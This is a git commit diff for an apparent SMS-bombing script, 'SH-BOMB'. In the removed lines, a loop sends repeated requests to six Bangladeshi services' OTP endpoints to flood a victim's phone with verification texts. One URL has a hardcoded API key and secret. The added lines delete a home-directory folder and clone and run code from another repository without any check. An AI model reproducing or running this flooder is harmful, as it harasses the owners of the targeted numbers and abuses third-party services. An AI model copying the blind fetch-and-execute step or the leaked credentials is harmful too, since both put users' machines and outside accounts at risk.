3d5936a5d03a9763c809324ff427151b921c5831
MD TASRIF HOSSEN <85736436+ShTasrif@users.noreply.github.com>
2021-11-05 13:57:04 +0600

    Add files via upload

--- sh.py
+++ sh.py
@@ -8,7 +8,6 @@ import sys
 
 import time
 
-os.system("pip install requests")
 
 os.system("clear")
 
@@ -56,7 +55,7 @@ logo=(green+"""
  
 
 line=(yellow+"======================================================")
-tversion=(cyan+"\t\t     Version : 1.0.2 ")
+tversion=(cyan+"\t\t     Version : 1.0.4 ")
 
 line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
  
@@ -78,102 +77,7 @@ print(note)
 
 print(line)
 
+print(" \t\tOur Tool has been changed")
 
+os.system("cd $HOME && rm -rf SH-BOMB && git clone https://github.com/ShTasrif/cybersh && cd cybersh && python main.py")
 
-print(green+"\t\t[•]Checking For Updates...")
-
-version = open(".version.txt", "r")
-
-mainversion = requests.get("https://raw.githubusercontent.com/ShTasrif/SH-BOMB/main/.version.txt")
-
-time.sleep(0.6)
-
-if(version.read() == mainversion.text):
-
-	print(cyan+"You are using the latest version of SH-BOMB")
-
-else:
-
-	print(' ')
-	print(' ')
-	print(red+"\t\t[✓]Tool Update Found")
-
-	print(blue+"\t\tUpdating Tool...")
-
-	os.system("cd .. && rm -rf SH-BOMB && git clone https://github.com/ShTasrif/SH-BOMB > /dev/null 2>&1 && cd SH-BOMB && python sh.py")
-
-os.system("clear")	
-
-print(logo)
-
-print(" ")
-
-print(dtls)
-
-print(tversion)
-
-print(line)
-
-print(note)
-
-print(line)
-
-print(lightblue+'\t\t1 SMS Can Send Upto 6 SMS')
-
-
-print(' ')
-
-number=str(input(red+"[➙] Enter Your Number : "))
-amount=int(input(cyan+"[➙] Enter The Amount : "))
-
-url1 = "https://ss.binge.buzz/otp/send/login"
-
-headers1 = CaseInsensitiveDict()
-headers1["Content-Type"] = "application/x-www-form-urlencoded"
-
-data1 = "phone="+number
-
-
-
-url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
-
-headers2 = CaseInsensitiveDict()
-headers2["Content-Type"] = "application/json"
-headers2["Content-Length"] = "0"
-
-
-url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
-
-url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"
-
-headers4 = CaseInsensitiveDict()
-headers4["Content-Type"] = "application/json"
-
-data4 = '{\"mobile\":\"'+number+'\"}'
-
-url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"
-
-headers5 = CaseInsensitiveDict()
-headers5["Content-Type"] = "application/x-www-form-urlencoded"
-
-data5 = "msisdn="+number
-
-url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
-headers6 = CaseInsensitiveDict()
-headers6["Content-Type"] = "application/json"
-
-data6 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'
-
-for i in range (amount):
-	resp1 = requests.post(url1, headers=headers1, data=data1)
-	resp2 = requests.post(url2, headers=headers2)
-	resp3 = requests.get(url3)
-	resp4 = requests.post(url4, headers=headers4,data=data4)
-	resp5 = requests.post(url5, headers=headers5, data=data5)
-	resp = requests.post(url6, headers=headers6, data=data6)	
-	print(str(i+1)+green+'.	➙SMS Sent ✅')
-	
-print('					')
-print(cyan+'\t\tThanks For Using SH-BOMB')
-
-os.system("xdg-open https://youtube.com/c/TASRIFMULTIMEDIA")
